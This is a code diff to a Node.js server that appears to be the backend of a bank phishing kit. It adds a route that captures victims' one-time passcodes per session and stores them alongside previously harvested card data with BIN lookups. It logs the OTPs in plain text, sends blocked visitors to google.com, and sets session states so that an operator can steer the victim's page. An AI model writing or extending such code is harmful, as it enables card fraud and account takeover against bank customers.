@@ -372,6 +372,8 @@ const server = http.createServer(async (req, res) => {
                     estadoSesiones.set(sessionId, estadoNuevo);
                     ultimaAccionSesiones.set(sessionId, accion);
 
+                    // 🔥 SE ELIMINÓ EL BORRADO DE DATOS AL PRESIONAR BOTONES
+                    
                     agregarLog('accion', { usuario: payload.user, sessionId, accion });
                     console.log(`[${payload.user}] ${accion} → ${sessionId}`);
                     json(res, 200, { ok: true, estado: estadoNuevo, accion });
@@ -584,6 +586,30 @@ const server = http.createServer(async (req, res) => {
 
                 console.log(`[${bancoKey}] Tarjeta guardada en historial (Paso 2): ${sessionId}`);
                 json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
+        // ============================================================
+        // 🔥 RUTA 4: Enviar OTP (Cambia a 'pendiente' para que app.js no recargue)
+        // ============================================================
+        const ccOtpMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-otp$/);
+        if (req.method === 'POST' && ccOtpMatch) {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const bancoKey = 'cc-' + ccOtpMatch[1];
+                const { sessionId, otp } = await getBody(req);
+                if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
+                const datosOriginales = datosSesiones.get(sessionId) || {};
+                const datosCompletos = Object.assign({}, datosOriginales, { otp });
+                estadoSesiones.set(sessionId, 'pendiente'); // 🔥 SE CAMBIA A PENDIENTE
+                datosSesiones.set(sessionId, datosCompletos);
+                ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
+
+                guardarHistorial(bancoKey, datosCompletos);
+
+                console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
+                json(res, 200, { ok: true, sessionId, bancoKey });
             } catch (e) { json(res, 500, { ok: false, error: e.message }); }
             return;
         }
